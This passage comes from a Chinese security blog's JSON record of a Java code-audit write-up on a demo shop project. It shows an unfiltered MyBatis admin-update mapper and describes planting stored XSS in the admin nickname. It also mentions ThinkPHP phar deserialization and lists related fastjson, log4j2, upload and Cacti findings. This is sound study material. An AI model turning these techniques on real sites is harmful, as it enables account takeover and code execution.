parameterType&#x3D;&quot;admin&quot;&gt;\n     UPDATE admin\n     &lt;set&gt;\n         &lt;if test&#x3D;&quot;admin.admin_profile_picture_src !&#x3D; null&quot;&gt;admin_profile_picture_src &#x3D; #&#123;admin.admin_profile_picture_src&#125;,&lt;&#x2F;if&gt;\n         &lt;if test&#x3D;&quot;admin.admin_nickname !&#x3D; null&quot;&gt;admin_nickname &#x3D; #&#123;admin.admin_nickname&#125;,&lt;&#x2F;if&gt;\n         &lt;if test&#x3D;&quot;admin.admin_password !&#x3D; null&quot;&gt;admin_password &#x3D; #&#123;admin.admin_password&#125;&lt;&#x2F;if&gt;\n     &lt;&#x2F;set&gt;\n     &lt;where&gt;\n         admin_id &#x3D; #&#123;admin.admin_id&#125;\n     &lt;&#x2F;where&gt;\n &lt;&#x2F;update&gt;</code></pre>\n\n<p>但是这时xss。。。。直接找该路由，插入xsspayload：</p>\n<p>后台查看发现，页面中插入的框框只有一个管理员昵称，正好管理员昵称也在这个方法里面，直接插如payload：</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/79.png\"></p>\n<p>插入好点保存，会直接退出登录，当再次登陆该管理员账号就会弹窗：</p>\n<p><img src=\"https://xingqiu-tuchuang-1256524210.cos.ap-shanghai.myqcloud.com/4444/80.png\"></p>\n<h2 id=\"吐槽：\"><a href=\"#吐槽：\" class=\"headerlink\" title=\"吐槽：\"></a>吐槽：</h2><p>跟php一样的审计，甚至感觉这个项目比php的更简单。可能是因为逻辑和结构更加严谨吧。还有就是没有做什么过滤。</p>\n<p>前几天看一个thinkphp的cms代码，使用的是thinkphp5.1.41。直接就懵了，不知道怎么办。后面看了很多文章，发现，这个版本的tp有反序列化链。虽然项目没有unserialize，但是可以使用phar反序列化，直接就命令执行了。</p>\n<p>果然，学习理论只是第一步。只有将理论和实际结合，之后才可能将理论融汇贯通。真正的变成自己的技能。不然，再怎么学，一段时间不用可能就忘了。如果忽然实战审计，也会懵逼。难过那么多CTF大佬，最后去挖洞也能挖的很多。各种利用，各种绕过，各种特性已经被他们玩花了。</p>\n<p>安全安全，有了实际的存在，才有了保护安全的必要。所以，安全可以说是任何存在事物的一个属性。最后解决安全问题的还得是产生安全问题的。</p>\n<p>要想往上走，还得学开发。一种是自己当程序员写安全的代码，但是这个谁能保证自己的代码就一定安全呢？而且写代码的有那么多？就是自己写的没问题，同一个项目的同事写的就不一定了。另一种就是安全开发，替开发解决安全问题。开发随便写，只要使用安全工具能解决外来攻击者的一切攻击。对比起来，还是安全开发的路更好，也更实际。专业的问题就交给专业的人来解决。</p>\n","text":" 环境搭建：项目地址：https://gitee.com/project_team/Tmall_demo#%E8%BF%B7%E4%BD%A0%E5%A4%A9%E7%8C%AB%E5%95%86%E5%9F%8E 大佬视频教程链接：https://www.bilibili.co...","link":"","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"Java","slug":"Java","count":18,"path":"api/tags/Java.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%9A\"><span class=\"toc-text\">环境搭建：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%AE%A1%E8%AE%A1%EF%BC%9A\"><span class=\"toc-text\">审计：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6%E5%AE%A1%E8%AE%A1%EF%BC%9A\"><span class=\"toc-text\">第三方组件审计：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#fastjson1-2-78%EF%BC%9A\"><span class=\"toc-text\">fastjson1.2.78：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A\"><span class=\"toc-text\">fastjson漏洞复现：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#log4j2-2-16-0%EF%BC%9A\"><span class=\"toc-text\">log4j2   2.16.0：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%9A\"><span class=\"toc-text\">log4j2漏洞复现：</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%9A\"><span class=\"toc-text\">任意文件上传：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%AE%A1%E7%90%86%E5%91%98%E5%A4%B4%E5%83%8F%EF%BC%9A\"><span class=\"toc-text\">管理员头像：</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%A7%E5%93%81%E5%9B%BE%E7%89%87%EF%BC%9A\"><span class=\"toc-text\">产品图片：</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#sql%E6%B3%A8%E5%85%A5%EF%BC%9A\"><span class=\"toc-text\">sql注入：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AD%98%E5%82%A8%E5%9E%8Bxss%EF%BC%9A\"><span class=\"toc-text\">存储型xss：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%90%90%E6%A7%BD%EF%BC%9A\"><span class=\"toc-text\">吐槽：</span></a></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Cacti前台命令注入漏洞(CVE-2022-46169)复现","uid":"d01e9b9478aaf264048aea2ee163e73a","slug":"Cacti前台命令注入漏洞-CVE-2022-46169-复现","date":"2022-12-15T08:49:17.000Z","updated":"2022-12-19T05:28:23.739Z","comments":true,"path":"api/articles/Cacti前台命令注入漏洞-CVE-2022-46169-复现.json","keywords":null,"cover":[],"text":" 直接看文章复现：https://github.com/vulhub/vulhub/blob/master/cacti/CVE-2022-46169/README.zh-cn.md payload没有回显：GET &#x2F;remote_agent.php?action&#x3...","link":"","photos":[],"count_time":{"symbolsCount":"4.5k","symbolsTime":"4 mins."},"categories":[{"name":"RCE","slug":"RCE","count":2,"path":"api/categories/RCE.json"}],"tags":[{"name":"PHP","slug":"PHP","count":7,"path":"api/tags/PHP.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Java代码审计学习","uid":"241d6a7bc9b104c51a615919491c3ad9","slug":"Java代码审计学习","date":"2022-12-09T10:29:21.000Z","updated":"2022-12-09T11:01:00.652Z","comments":true,"path":"api/articles/Java代码审计学习.json","keywords":null,"cover":[],"text":" 环境搭建：视频教程地址：https://www.bilibili.com/video/BV11t4y1n7KU/?share_source=copy_web&amp;vd_source=8ca6ac59b747f3cadc0c59cff919b9e5 文档地址：https://...","link":"","photos":[],"count_time":{"symbolsCount":"57k","symbolsTime":"52 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"Java","slug":"Java","count":18,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}